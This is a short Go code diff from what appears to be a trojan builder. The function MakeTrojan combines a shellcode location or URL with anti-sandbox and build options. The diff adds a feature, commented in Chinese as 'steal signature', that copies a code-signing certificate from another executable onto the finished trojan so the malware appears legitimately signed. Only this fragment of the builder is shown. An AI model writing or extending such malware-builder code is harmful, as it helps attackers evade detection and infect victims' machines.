@@ -29,6 +29,7 @@ type Option struct {
 	Separate          string
 	ShellcodeLocation string
 	ShellcodeUrl      string
+	SignFileLoc       string
 	AntiSandboxOpt    AntiSandboxOption
 	BuildOpt          BuildOption
 }
@@ -107,6 +108,12 @@ func MakeTrojan(options Option) {
 	addAntiSandbox(options.AntiSandboxOpt)
 	//根据build参数生成木马
 	finalBuild(options.BuildOpt, options.DstFile)
+	//窃取签名
+	if options.SignFileLoc != "" {
+		FileCopy(options.DstFile, path.Join(TempDir, "cert-before.exe"))
+		writecertfromexe(path.Join(TempDir, "cert-after.exe"), path.Join(TempDir, "cert-before.exe"), options.SignFileLoc)
+		FileCopy(path.Join(TempDir, "cert-after.exe"), options.DstFile)
+	}
 	println("build done!")
 	//清理临时文件夹
 	os.RemoveAll(TempDir)
